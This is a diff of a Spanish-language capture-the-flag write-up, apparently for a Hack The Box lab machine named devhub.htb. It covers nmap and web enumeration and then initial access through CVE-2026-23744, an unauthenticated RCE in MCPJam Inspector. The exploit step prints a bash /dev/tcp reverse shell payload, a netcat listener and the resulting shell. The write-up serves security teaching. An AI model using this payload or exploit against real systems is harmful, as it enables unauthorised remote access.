-SF:RYhT9Xb\.js\&quot;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x2
-SF:0crossorigin\x20href=\&quot;/assets/index-XvFRNbCs\.css\&quot;&gt;\n\x20\x20&lt;/head&gt;\
-SF:n\x20\x20&lt;body&gt;\n\x20\x20\x20\x20&lt;div\x20id=\&quot;root\&quot;&gt;&lt;/div&gt;\n\x20\x20&lt;/
-SF:body&gt;\n&lt;/html&gt;\n&quot;)%r(HTTPOptions,F0,&quot;HTTP/1\.1\x20204\x20No\x20Content\
-SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
-SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
-SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Mon,\x2001\x20Jun\x20
-SF:2026\x2006:40:06\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;)%r(RTSPRequest
-SF:,F0,&quot;HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
-SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
-SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
-SF:UTF-8\r\nDate:\x20Mon,\x2001\x20Jun\x202026\x2006:40:06\x20GMT\r\nConne
-SF:ction:\x20close\r\n\r\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Req
-SF:uest\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,&quot;HTTP/
-SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSSt
-SF:atusRequestTCP,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
-SF:0close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
-SF:ction:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\.1\x20400\x20Bad\x
-SF:20Request\r\nConnection:\x20close\r\n\r\n&quot;);
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Mon Jun  1 06:40:15 2026 -- 1 IP address (1 host up) scanned in 46.93 seconds
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sCV<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="o">=</span><span class="m">5000</span><span class="w"> </span>-oN<span class="w"> </span>nmap.txt<span class="w"> </span><span class="m">10</span>.129.3.242
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Nmap 7.99 scan initiated Mon Jun  1 06:39:28 2026 as: nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.3.242
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Nmap scan report for devhut.htb (10.129.3.242)
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Host is up (0.045s latency).
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Not shown: 65532 filtered tcp ports (no-response)
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>PORT     STATE SERVICE VERSION
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>| ssh-hostkey: 
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>|_http-title: Did not follow redirect to http://devhub.htb/
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>|_http-server-header: nginx/1.18.0 (Ubuntu)
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>6274/tcp open  unknown
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>| fingerprint-strings: 
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>|     HTTP/1.1 400 Bad Request
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>|     Connection: close
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>|   GetRequest: 
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>|     HTTP/1.1 200 OK
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>|     access-control-allow-credentials: true
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>|     content-length: 466
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>|     content-type: text/html; charset=utf-8
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>|     vary: Origin
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>|     Date: Mon, 01 Jun 2026 06:40:06 GMT
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>|     Connection: close
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>|     &lt;!doctype html&gt;
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>|     &lt;html lang=&quot;en&quot;&gt;
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>|     &lt;head&gt;
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>|     &lt;meta charset=&quot;UTF-8&quot; /&gt;
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>|     &lt;link rel=&quot;icon&quot; type=&quot;image/svg+xml&quot; href=&quot;/mcp_jam.svg&quot; /&gt;
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>|     &lt;title&gt;MCPJam Inspector&lt;/title&gt;
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>|     &lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index-DRYhT9Xb.js&quot;&gt;&lt;/script&gt;
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>|     &lt;link rel=&quot;stylesheet&quot; crossorigin href=&quot;/assets/index-XvFRNbCs.css&quot;&gt;
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>|     &lt;/head&gt;
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>|     &lt;body&gt;
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>|     &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>|     &lt;/body&gt;
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>|     &lt;/html&gt;
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>|   HTTPOptions, RTSPRequest: 
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>|     HTTP/1.1 204 No Content
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>|     access-control-allow-credentials: true
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>|     vary: Origin
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>|     content-type: text/plain; charset=UTF-8
+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>|     Date: Mon, 01 Jun 2026 06:40:06 GMT
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>|_    Connection: close
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>SF-Port6274-TCP:V=7.99%I=7%D=6/1%Time=6A1D2946%P=x86_64-pc-linux-gnu%r(Get
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>SF:Request,290,&quot;HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
+<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Mon,\x2001\x20Jun\x202026\x
+<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>SF:2006:40:06\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;h
+<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>SF:tml\x20lang=\&quot;en\&quot;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\
+<a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>SF:&quot;UTF-8\&quot;\x20/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;icon\&quot;\x20type=\&quot;image/s
+<a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>SF:vg\+xml\&quot;\x20href=\&quot;/mcp_jam\.svg\&quot;\x20/&gt;\n\x20\x20\x20\x20&lt;meta\x20nam
+<a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>SF:e=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1\.0\&quot;
+<a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>SF:\x20/&gt;\n\x20\x20\x20\x20&lt;title&gt;MCPJam\x20Inspector&lt;/title&gt;\n\x20\x20\x2
+<a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>SF:0\x20&lt;script\x20type=\&quot;module\&quot;\x20crossorigin\x20src=\&quot;/assets/index-D
+<a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>SF:RYhT9Xb\.js\&quot;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x2
+<a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>SF:0crossorigin\x20href=\&quot;/assets/index-XvFRNbCs\.css\&quot;&gt;\n\x20\x20&lt;/head&gt;\
+<a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a>SF:n\x20\x20&lt;body&gt;\n\x20\x20\x20\x20&lt;div\x20id=\&quot;root\&quot;&gt;&lt;/div&gt;\n\x20\x20&lt;/
+<a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a>SF:body&gt;\n&lt;/html&gt;\n&quot;)%r(HTTPOptions,F0,&quot;HTTP/1\.1\x20204\x20No\x20Content\
+<a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a>SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
+<a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
+<a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a>SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Mon,\x2001\x20Jun\x20
+<a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>SF:2026\x2006:40:06\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;)%r(RTSPRequest
+<a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a>SF:,F0,&quot;HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
+<a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a>SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
+<a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a>SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
+<a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>SF:UTF-8\r\nDate:\x20Mon,\x2001\x20Jun\x202026\x2006:40:06\x20GMT\r\nConne
+<a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a>SF:ction:\x20close\r\n\r\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Req
+<a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>SF:uest\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,&quot;HTTP/
+<a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a>SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSSt
+<a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a>SF:atusRequestTCP,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
+<a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a>SF:0close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
+<a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>SF:ction:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\.1\x20400\x20Bad\x
+<a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a>SF:20Request\r\nConnection:\x20close\r\n\r\n&quot;);
+<a id="__codelineno-1-79" name="__codelineno-1-79" href="#__codelineno-1-79"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<a id="__codelineno-1-80" name="__codelineno-1-80" href="#__codelineno-1-80"></a>
+<a id="__codelineno-1-81" name="__codelineno-1-81" href="#__codelineno-1-81"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-1-82" name="__codelineno-1-82" href="#__codelineno-1-82"></a># Nmap done at Mon Jun  1 06:40:15 2026 -- 1 IP address (1 host up) scanned in 46.93 seconds
+</code></pre></div>
 <p>El escaneo revela tres puertos interesantes:</p>
 <ul>
 <li><strong>22 (SSH):</strong> Corriendo OpenSSH 8.9p1. Lo ignoramos por ahora al carecer de credenciales.</li>
@@ -1226,10 +1279,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <li><strong>6274 (Unknown):</strong> Un servicio web desconocido. Nmap ha logrado extraer el código fuente de la página de inicio, revelando el título <code>MCPJam Inspector</code> y referencias a una aplicación web <em>frontend</em> construida en React/Vite.</li>
 </ul>
 <p>Añadimos el dominio a nuestro archivo de resolución:</p>
-<pre><code class="language-bash">sudo vim /etc/hosts
-# Añadimos la línea: 10.129.3.242 devhub.htb
-</code></pre>
-<h3 id="enumeracion-web-puerto-80">Enumeración Web (Puerto 80)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>vim<span class="w"> </span>/etc/hosts
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># Añadimos la línea: 10.129.3.242 devhub.htb</span>
+</code></pre></div>
+<h3 id="enumeracion-web-puerto-80">Enumeración Web (Puerto 80)<a class="headerlink" href="#enumeracion-web-puerto-80" title="Permanent link">&para;</a></h3>
 <p>Al acceder a <code>http://devhub.htb</code>, nos encontramos con un portal estático que detalla la infraestructura interna de desarrollo y un análisis de la empresa.</p>
 <p><img alt="Portal DevHub" src="cap1.PNG" /></p>
 <p>El portal actúa como un panel de información que nos aporta datos sobre cómo está organizada la máquina internamente. Entre los datos expuestos vemos:</p>
@@ -1239,88 +1292,88 @@ Service detection performed. Please report any incorrect results at https://nmap
 <li>El stack tecnológico: Node.js, Python 3, Jupyter, y Ubuntu 24.04.</li>
 </ul>
 <p>Dado que la página no ofrece ninguna funcionalidad interactiva, procedemos a realizar un Fuzzing con la herramienta <code>dirsearch</code> para descartar paneles de administración ocultos:</p>
-<pre><code class="language-bash">dirsearch -u http://devhub.htb/
-</code></pre>
-<pre><code class="language-text">  _|. _ _  _  _  _ _|_    v0.5.0
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295
-
-Target: http://devhub.htb/
-
-[06:42:31] Scanning: 
-[06:44:02] 200 -    3KB - /index.html
-
-Task Completed
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://devhub.htb/
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>  _|. _ _  _  _  _ _|_    v0.5.0
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a> (_||| _) (/_(_|| (_| )
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Target: http://devhub.htb/
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>[06:42:31] Scanning: 
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>[06:44:02] 200 -    3KB - /index.html
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>Task Completed
+</code></pre></div>
 <p>Al no encontrar nuevos directorios, realizamos un descubrimiento de <em>VHOSTS</em> mediante <code>gobuster</code>. En entornos corporativos es muy común que un mismo servidor web aloje diferentes aplicaciones bajo distintos subdominios.</p>
-<pre><code class="language-bash">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devhub.htb/ --append-domain
-</code></pre>
-<pre><code class="language-text">===============================================================
-Starting gobuster in VHOST enumeration mode
-===============================================================
-Progress: 20000 / 20000 (100.00%)
-===============================================================
-Finished
-===============================================================
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gobuster<span class="w"> </span>vhost<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt<span class="w"> </span>-u<span class="w"> </span>http://devhub.htb/<span class="w"> </span>--append-domain
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>===============================================================
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Starting gobuster in VHOST enumeration mode
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>===============================================================
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Progress: 20000 / 20000 (100.00%)
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>===============================================================
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Finished
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>===============================================================
+</code></pre></div>
 <p>Tanto la enumeración de directorios como la de vhosts nos devuelven resultados limpios. Esto nos confirma al 100% que el vector de entrada no reside en el servidor web estándar, sino el servicio desplegado en el puerto <code>6274</code>.</p>
 <hr />
-<h2 id="2-acceso-inicial-foothold">2. Acceso Inicial (Foothold)</h2>
-<h3 id="cve-2026-23744-unauthenticated-rce-en-mcpjam">CVE-2026-23744 - Unauthenticated RCE en MCPJam</h3>
+<h2 id="2-acceso-inicial-foothold">2. Acceso Inicial (Foothold)<a class="headerlink" href="#2-acceso-inicial-foothold" title="Permanent link">&para;</a></h2>
+<h3 id="cve-2026-23744-unauthenticated-rce-en-mcpjam">CVE-2026-23744 - Unauthenticated RCE en MCPJam<a class="headerlink" href="#cve-2026-23744-unauthenticated-rce-en-mcpjam" title="Permanent link">&para;</a></h3>
 <p>Al acceder al puerto <code>6274</code> a través de nuestro navegador, identificamos la interfaz de <strong>MCPJam Inspector</strong>. Revisando el panel, descubrimos que la versión corriendo es la <strong>v1.4.2</strong>.</p>
 <p><img alt="Versión MCPJam" src="cap2.png" /></p>
 <p>Una rápida búsqueda de vulnerabilidades para esta versión nos revela que es vulnerable a <strong>CVE-2026-23744</strong>, un fallo crítico que permite la Ejecución Remota de Código (RCE) sin necesidad de autenticación.</p>
 <p>Para explotarlo, utilizaremos un PoC público escrito en Python (<a href="https://github.com/d3vn0mi/CVE-2026-23744-POC">Repositorio GitHub</a>). Antes de lanzarlo, es imperativo dejar un listener de Netcat a la escucha en nuestra máquina atacante por el puerto que deseemos (en este caso, el 4444):</p>
-<pre><code class="language-bash">nc -lvnp 4444
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
 <p>Una vez con el listener preparado, ejecutamos el exploit pasándole la IP víctima y nuestro payload (una reverse shell clásica de bash):</p>
-<pre><code class="language-bash">python3 exploit.py -t 10.129.4.61 -c &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;TU_IP&gt;/4444 0&gt;&amp;1'&quot;
-</code></pre>
-<pre><code class="language-text">     _____ _   _ _____      ____   ___ ____   __        ____  _____ ______ _  _  _  _
-  / ____| \ | |  ___|    |___ \ / _ \___ \ / /_      |___ \|___ /|____  | || || || |
- | |    |  \| | |__    ___  __) | | | |__) | '_ \ _____ __) | |_ \   / /| || || || |
- | |    | . ` |  __| |___||__ &lt;| | | |__ &lt;| (_) |_____|__ &lt; ___) | / / |__   _   _|
- | |____|_|\__|  |___      ___) | |_| |__) |\___/     ___) |____/ / /     | | | |
-  \_____|     |_____|     |____/ \___/____/           |____/      /_/      |_| |_|
-
-  [ MCP Server Unauthenticated RCE — Proof of Concept ]
-  [ Author: d3vn0mi | For authorised security testing only ]
-
-  [*] Probing 10.129.4.61:6274 (timeout 30s) ...
-  [+] Target is up and reachable.
-
-  [*] Target URL : http://10.129.4.61:6274/api/mcp/connect
-  [*] Command    : bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;TU_IP&gt;/4444 0&gt;&amp;1'
-  [*] Server ID  : rce_exploit
-
-  [*] Sending exploit payload ...
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>python3<span class="w"> </span>exploit.py<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.129.4.61<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;TU_IP&gt;/4444 0&gt;&amp;1&#39;&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>     _____ _   _ _____      ____   ___ ____   __        ____  _____ ______ _  _  _  _
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>  / ____| \ | |  ___|    |___ \ / _ \___ \ / /_      |___ \|___ /|____  | || || || |
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a> | |    |  \| | |__    ___  __) | | | |__) | &#39;_ \ _____ __) | |_ \   / /| || || || |
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a> | |    | . ` |  __| |___||__ &lt;| | | |__ &lt;| (_) |_____|__ &lt; ___) | / / |__   _   _|
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a> | |____|_|\__|  |___      ___) | |_| |__) |\___/     ___) |____/ / /     | | | |
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>  \_____|     |_____|     |____/ \___/____/           |____/      /_/      |_| |_|
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>  [ MCP Server Unauthenticated RCE — Proof of Concept ]
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>  [ Author: d3vn0mi | For authorised security testing only ]
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>  [*] Probing 10.129.4.61:6274 (timeout 30s) ...
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>  [+] Target is up and reachable.
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>  [*] Target URL : http://10.129.4.61:6274/api/mcp/connect
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>  [*] Command    : bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;TU_IP&gt;/4444 0&gt;&amp;1&#39;
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>  [*] Server ID  : rce_exploit
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>  [*] Sending exploit payload ...
+</code></pre></div>
 <p>Volvemos a nuestra pestaña de Netcat y vemos que hemos recibido la conexión, obteniendo acceso al sistema como el usuario <code>mcp-dev</code>:</p>
-<pre><code class="language-bash">nc -lvnp 4444
-Listening on 0.0.0.0 4444
-Connection received on 10.129.4.61 56080
-bash: cannot set terminal process group (1073): Inappropriate ioctl for device
-bash: no job control in this shell
-mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
-mcp-dev
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Connection<span class="w"> </span>received<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.129.4.61<span class="w"> </span><span class="m">56080</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>bash:<span class="w"> </span>cannot<span class="w"> </span><span class="nb">set</span><span class="w"> </span>terminal<span class="w"> </span>process<span class="w"> </span>group<span class="w"> </span><span class="o">(</span><span class="m">1073</span><span class="o">)</span>:<span class="w"> </span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
